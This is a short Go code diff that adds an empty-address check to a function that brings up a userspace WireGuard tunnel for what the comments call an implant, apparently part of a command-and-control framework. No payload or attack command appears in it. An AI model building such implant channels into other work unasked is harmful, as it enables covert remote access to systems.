@@ -227,6 +227,11 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 // bringUpWGInterface - First creates an inet.af network stack.
 // then creates a Wireguard device/interface and applies configuration
 func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
+	if netstackTunIP == "" {
+		err := errors.New("[wireguard] Cannot connect to empty IP address")
+		return nil, nil, nil, err
+	}
+
 	tun, tNet, err := netstack.CreateNetTUN(
 		[]netip.Addr{netip.MustParseAddr(netstackTunIP)},
 		[]netip.Addr{netip.MustParseAddr("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
